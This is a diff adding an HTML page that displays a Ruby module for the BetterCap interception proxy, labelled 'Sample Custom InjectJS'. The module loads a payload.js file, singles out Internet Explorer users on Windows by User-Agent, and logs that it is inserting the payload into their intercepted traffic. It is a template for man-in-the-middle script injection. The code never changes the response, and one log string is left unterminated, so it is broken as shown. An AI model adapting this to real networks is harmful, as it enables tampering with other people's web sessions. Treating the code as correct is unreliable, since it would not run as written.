@@ -1,0 +1,56 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Sample Custom InjectJS</title>
+</head><body>=begin<br/>
+<br/>
+BETTERCAP<br/>
+<br/>
+Author : <br/>
+Email : <br/>
+Blog : <br/>
+<br/>
+=end<br/>
+<br/>
+class Custom &lt; BetterCap::Proxy::HTTP::Module<br/>
+&nbsp; &nbsp; meta(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; 'Name'&#09;&#09;=&gt; 'Custom',<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; 'Description'&#09;=&gt; 'Custom',<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; 'Version'&#09;&#09;=&gt; '1',<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; 'Author'&#09;&#09;=&gt; 'Custom',<br/>
+&nbsp; &nbsp; )<br/>
+<br/>
+@@verbose = true<br/>
+@@options = nil<br/>
+@@js = File.read("payload.js")<br/>
+<br/>
+def self.on_options(opts)<br/>
+&nbsp; &nbsp; opts.separator ""<br/>
+&nbsp; &nbsp; opts.separator "Options:"<br/>
+&nbsp; &nbsp; opts.separator ""<br/>
+&nbsp; &nbsp; opts.on('--verbose','Verbose logging') do |v|<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; @@options = v<br/>
+&nbsp; &nbsp; end<br/>
+end<br/>
+<br/>
+def initialize<br/>
+&nbsp; &nbsp; @@verbose = false if @@options.nil?<br/>
+end<br/>
+<br/>
+def on_request(request, response)<br/>
+&nbsp; &nbsp; if detect_ie(request)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; BetterCap::Logger.info "IE Detected: #{request.headers['User-Agent']}".green<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; BetterCap::Logger.info "Inserting payload"<br/>
+&nbsp; &nbsp; else<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if @@verbose<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; BetterCap::Logger.info "Non-IE Detected: #{request.headers['User-Agent']}.red<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; end<br/>
+&nbsp; &nbsp; end<br/>
+end<br/>
+<br/>
+private<br/>
+def detect_ie(request)<br/>
+&nbsp; &nbsp; request.headers.has_key?('User-Agent') and request.headers['User-Agent'] =~ /Windows NT/ and request.headers['User-Agent'] =~ /Trident/<br/>
+&nbsp; &nbsp; end<br/>
+end</body></html>
